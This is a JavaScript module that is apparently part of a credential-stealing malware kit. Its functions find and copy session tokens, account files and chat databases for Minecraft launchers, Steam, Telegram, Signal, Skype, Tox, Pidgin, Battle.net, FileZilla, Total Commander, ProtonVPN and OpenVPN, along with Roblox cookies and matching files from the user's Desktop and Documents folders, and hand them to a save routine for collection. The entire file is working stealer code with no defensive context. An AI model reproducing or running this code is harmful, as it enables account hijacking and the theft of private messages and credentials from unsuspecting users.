const fs = require("fs");
const save = require("./save");
const { stat } = require("./stats");
const config = require("../config");
const path = require("path");

class SimpleFile {
    constructor(name, mainfolder, existpath, stealpath) {
        this.name = name;
        this.mainfolder = mainfolder;
        this.existpath = existpath;
        this.stealpath = stealpath;
    }
}

function grabSimple() {
    const local = process.env.localappdata;
    const appdata = process.env.appdata;

    const simples = [
        new SimpleFile("Growtopia", "Games", local + "\\Growtopia\\", [
            local + "\\Growtopia\\save.dat",
        ]),
        new SimpleFile("Minecraft", "Games", appdata + "\\.minecraft\\", [
            appdata + "\\.minecraft\\launcher_accounts.json",
            appdata + "\\.minecraft\\launcher_msa_credentials.bin",
            appdata + "\\.minecraft\\launcher_profiles.json",
        ]),
        new SimpleFile("Skype", "Messengers", appdata + "\\Microsoft\\Skype for Desktop\\Local Storage\\", [
            appdata + "\\Microsoft\\Skype for Desktop\\Local Storage\\"
        ]),
        new SimpleFile("Element", "Messengers", appdata + "\\Element\\Local Storage\\", [
            appdata + "\\Element\\Local Storage\\"
        ]),
        new SimpleFile("Signal", "Messengers", appdata + "\\Signal\\", [
            appdata + "\\Signal\\Local Storage\\",
            appdata + "\\Signal\\Session Storage\\",
            appdata + "\\Signal\\sql\\",
            appdata + "\\Signal\\databases\\",
            appdata + "\\Signal\\config.json",
        ]),
        new SimpleFile("ICQ", "Messengers", appdata + "\\ICQ\\0001\\", [
            appdata + "\\ICQ\\0001\\"
        ]),
        new SimpleFile("FileZilla", "SysAdmin", appdata + "\\FileZilla\\", [
            appdata + "\\FileZilla\\recentservers.xml",
        ]),
        new SimpleFile("OpenVPN Connect", "VPN", appdata + "\\OpenVPN Connect\\", [
            appdata + "\\OpenVPN Connect\\profiles",
        ]),
        new SimpleFile("Shadow", "SysAdmin", appdata + "\\shadow\\", [
            appdata + "\\shadow\\Local State",
            appdata + "\\shadow\\Local Storage\\",
            appdata + "\\shadow\\Session Storage\\",
        ]),
        new SimpleFile("TotalCommander", "SysAdmin", appdata + "\\GHISLER\\", [
            appdata + "\\GHISLER\\wcx_ftp.ini",
        ]),
        new SimpleFile("LunarClient", "Games", process.env.userprofile + "\\.lunarclient\\settings\\game\\", [
            process.env.userprofile + "\\.lunarclient\\settings\\games\\accounts.txt",
        ]),
        new SimpleFile("FeatherClient", "Games", appdata + "\\.feather\\", [
            appdata + "\\.feather\\accounts.json",
        ]),
        new SimpleFile("EssentialClient", "Games", appdata + "\\.minecraft\\essential", [
            appdata + "\\.minecraft\\essential\\microsoft_accounts.json",
        ]),
        new SimpleFile("TLauncher", "Games", appdata + "\\.tlauncher\\mcl\\Minecraft\\game\\", [
            appdata + "\\.tlauncher\\mcl\\Minecraft\\game\\tlauncher_profiles.json"
        ])
    ]

    for (let i = 0; i < simples.length; i++) {
        const simple = simples[i];
        if (fs.existsSync(simple.existpath)) {
            if (simple.mainfolder == "SysAdmin") {
                stat.AddSysAdmin(simple.name)
            }
            if (simple.mainfolder == "Messengers") {
                stat.AddMessenger(simple.name)
            }
            if (simple.mainfolder == "Games") {
                stat.AddGames(simple.name)
            }
            save.ArraySave(simple.stealpath, simple.mainfolder, simple.name)
        }
    }
}

function grabRoblox(cookies, profile, i) {
    var robloxCookies = [];
    for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i];
        if (cookie.host.includes("roblox")) {
            robloxCookies.push(cookie);
        }
    }

    if (robloxCookies.length != 0) {
        stat.AddGames(`Roblox@${profile + i}`);
        save.saveRoblox(robloxCookies, profile + i);
    }
}

function grabSteam() {
    const mainPath = [
        "C:\\program files (x86)\\steam\\",
        "C:\\program files\\steam\\"
    ]

    var saves = [];

    for (let i = 0; i < mainPath.length; i++) {
        const path = mainPath[i];

        if (fs.existsSync(path)) {
            const files = fs.readdirSync(path);

            for (let u = 0; u < files.length; u++) {
                const file = files[u];

                const savePath = path + file;

                if (file.includes("ssfn")) {
                    saves.push(savePath)
                }
            }

            const configPath = path + "config\\"

            if (fs.existsSync(configPath)) {
                saves.push(configPath)
            }
        }
    }

    if (saves.length != 0) {
        stat.AddGames("Steam")
        save.ArraySave(saves, "Games", "Steam");
    }
}

function grabTelegram() {
    const appdata = process.env.appdata;
    const telegram_path = appdata + "\\Telegram Desktop\\tdata\\";

    if (!fs.existsSync(telegram_path)) {
        return;
    }

    var saves = [];

    const files = fs.readdirSync(telegram_path);

    for (var i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = telegram_path + file;
        if (fs.lstatSync(savePath).isDirectory()) {
            if (file.length != 16) {
                continue;
            }

            saves.push(savePath + "//");
        } else {
            if (file.endsWith("s") || file.length == 17) {
                saves.push(savePath);
            }

            if (file.startsWith("settings") || file.startsWith("key_data") || file.startsWith("usertag")) {
                saves.push(savePath);
            }
        }
    }

    stat.AddMessenger("Telegram")
    save.ArraySave(saves, "Messengers", "Telegram")
}

function grabTox() {
    const appdata = process.env.appdata;
    const tox_path = appdata + "\\tox\\"

    var saves = [];

    if (!fs.existsSync(tox_path)) {
        return
    }

    if (fs.existsSync(tox_path)) {
        const files = fs.readdirSync(tox_path);

        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            const savePath = tox_path + file;

            if (file.endsWith(".tox") || file.endsWith(".ini") || file.endsWith(".db")) {
                saves.push(savePath);
            }
        }
    }

    stat.AddMessenger("Tox")
    save.ArraySave(saves, "Messengers", "Tox")
}

function grabPidgin() {
    const appdata = process.env.appdata;
    const mainPath = appdata + "\\.purple\\";

    if (!fs.existsSync(mainPath)) {
        return
    }

    if (fs.existsSync(mainPath + "accounts.xml")) {
        stat.AddMessenger("Pidgin");
        save.ArraySave([mainPath + "accounts.xml"], "Messengers", "Pidgin");
    }
}

function grabProton() {
    const local = process.env.localappdata
    const mainPath = local + "\\ProtonVPN\\"

    if (!fs.existsSync(mainPath)) {
        return
    }

    const files = fs.readdirSync(mainPath);
    var saves = [];

    for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = mainPath + file + "\\";

        if (fs.statSync(savePath).isDirectory) {
            if (file.includes("exe")) {
                const filesExe = fs.readdirSync(savePath);

                for (let u = 0; u < filesExe.length; u++) {
                    const fileExe = filesExe[u];

                    if (fs.existsSync(savePath + fileExe + "\\user.config")) {
                        saves.push(savePath + fileExe + "\\user.config")
                    }
                }
            }
        }
    }

    stat.AddVpn("ProtonVPN")
    save.ArraySave(saves, "VPN", "ProtonVPN")
}

function grabBattle() {
    const appdata = process.env.appdata
    const mainPath = appdata + "\\Battle.net\\"
    var saves = [];

    if (!fs.existsSync(mainPath)) {
        return
    }

    const files = fs.readdirSync(mainPath);

    for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const savePath = mainPath + file;

        if (file.includes("db") || file.includes("config")) {
            saves.push(savePath)
        }
    }

    stat.AddGames("Battle.net")
    save.ArraySave(saves, "Games", "Battlenet")
}

function fileGrabber() {
    const desktopFiles = config.desktopfiles.replace(/\*/gm, '.*').replace(/\./gm, '\\.').split(',');
    const documentsFiles = config.documentsfiles.replace(/\*/gm, '.*').replace(/\./gm, '\\.').split(',');

    const filesDesktop = fs.readdirSync(path.join(process.env.userprofile, 'Desktop/'));
    const filesDocuments = fs.readdirSync(path.join(process.env.userprofile, 'Documents/'));

    let grabbedFiles = [];

    for (let i = 0; i < filesDesktop.length; i++) {
        const file = filesDesktop[i];

        for (let u = 0; u < desktopFiles.length; u++) {
            const test = desktopFiles[u];

            if (file.match(new RegExp(test))) {
                grabbedFiles.push(path.join(process.env.userprofile, 'Desktop', file));
            }
        }
    }

    for (let i = 0; i < filesDocuments.length; i++) {
        const file = filesDocuments[i];

        for (let u = 0; u < documentsFiles.length; u++) {
            const test = documentsFiles[u];

            if (file.match(new RegExp(test))) {
                grabbedFiles.push(path.join(process.env.userprofile, 'Documents', file));
            }
        }
    }

    save.ArraySave(Array.from(new Set(grabbedFiles)), 'FilesGrabber', '');
}

module.exports = {
    grabSimple,
    grabSteam,
    grabTelegram,
    grabTox,
    grabProton,
    grabBattle,
    grabRoblox,
    grabPidgin,
    fileGrabber
}
